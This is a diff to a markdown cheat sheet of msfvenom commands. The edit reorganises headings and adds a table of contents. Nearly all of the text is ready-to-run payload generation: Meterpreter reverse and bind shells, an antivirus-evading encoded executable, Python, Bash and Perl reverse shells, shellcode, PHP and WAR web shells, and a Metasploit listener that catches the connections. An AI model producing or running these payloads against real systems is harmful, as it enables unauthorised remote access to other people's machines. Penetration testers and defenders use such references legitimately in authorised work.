@@ -2,6 +2,12 @@
 
 - [Binaries](#Binaries)
     - [Linux](##Linux)
+- [Scripting](#Scripting)
+- [Shellcode](#Shellcode)
+- [Web](#Web)
+
+- [Handlers](#Handlers)
+- [Tools](##Tools)
 
 # Binaries
 - ## Linux
@@ -14,7 +20,7 @@
   - Reverse shell
     
 
-- Windows
+- ## Windows
   - Meterpreter reverse shell
     - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
   - Meterpreter bind shell
@@ -26,10 +32,10 @@
   - Meterpreter encoded reverse shell 
     - msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
   
-- Mac
+- ## Mac
   - msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
 
-#### Scripting Payloads
+# Scripting 
 - Python
   - msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
 - Bash
@@ -37,7 +43,7 @@
 - Perl
   - msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
   
-#### Shellcode 
+# Shellcode 
 - Linux Based Shellcode
   - msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
 - Windows Based Shellcode
@@ -45,7 +51,7 @@
 - Mac Based Shellcode
   - msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
   
-#### Web Payloads
+# Web 
 - PHP
   - msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
 cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
@@ -56,7 +62,7 @@ cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> s
 - WAR
   - msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
 
-#### Handlers
+# Handlers
 ```
 use exploit/multi/handler
 set PAYLOAD <Payload name>
@@ -65,4 +71,5 @@ set LPORT <LPORT value>
 set ExitOnSession false
 exploit -j -z
 ```
-https://github.com/g0tmi1k/msfpc
+## Tools
+- https://github.com/g0tmi1k/msfpc
